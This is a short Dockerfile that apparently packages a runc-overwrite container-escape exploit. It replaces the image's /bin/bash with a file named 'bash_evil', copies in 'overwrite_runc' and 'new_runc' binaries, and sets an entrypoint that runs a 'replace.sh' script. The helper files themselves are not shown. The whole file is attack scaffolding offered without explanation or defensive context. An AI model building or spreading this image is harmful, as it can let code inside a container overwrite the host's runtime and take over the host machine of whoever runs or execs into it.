FROM ubuntu:latest

RUN ["apt-get", "update"]
RUN ["apt-get", "install", "-y", "vim"]

COPY replace.sh /
RUN ["chmod", "+x", "/replace.sh"]
COPY overwrite_runc /overwrite_runc
RUN ["chmod", "+x", "/overwrite_runc"]
COPY new_runc /

RUN ["mv", "/bin/bash", "/bin/bash_original"]
COPY bash_evil /bin/bash
RUN ["chmod", "+x", "/bin/bash"]

ENTRYPOINT ["/bin/bash_original", "/replace.sh"]
